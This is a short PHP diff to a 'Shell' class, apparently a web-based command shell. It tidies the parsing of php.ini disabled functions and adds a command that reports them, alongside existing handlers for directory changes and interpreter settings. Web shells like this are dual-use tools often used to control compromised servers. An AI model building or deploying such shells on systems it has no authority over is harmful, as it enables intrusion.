@@ -48,7 +48,10 @@ class Shell{
 		if( !empty($disabled_functions) ){
 			$list = explode(',', $disabled_functions);
 			foreach($list as $function){
-				array_push($functions, trim($function));
+				$function = trim($function);
+				if( !empty($function) ){
+					array_push($functions, $function);
+				}
 			}
 		}
 		return $functions;
@@ -79,6 +82,9 @@ class Shell{
 				}
 			}elseif( preg_match('/^get_interpreter$/', $command) ){
 				echo "Current interpreter set as: {$this->config['interpreter']}";
+			}elseif( preg_match('/^get_disabled_functions$/', $command) ){
+				$disabled_functions = $this->disabled_functions();
+				echo "These functions are disabled throught php.ini: ".implode(','.chr(32), $disabled_functions);
 			}elseif( preg_match('/^cd (.*)/', $command, $match) ){
 				$_SESSION['cwd'] = realpath($match[1]);
 				echo "Changed directory to: {$_SESSION['cwd']}";
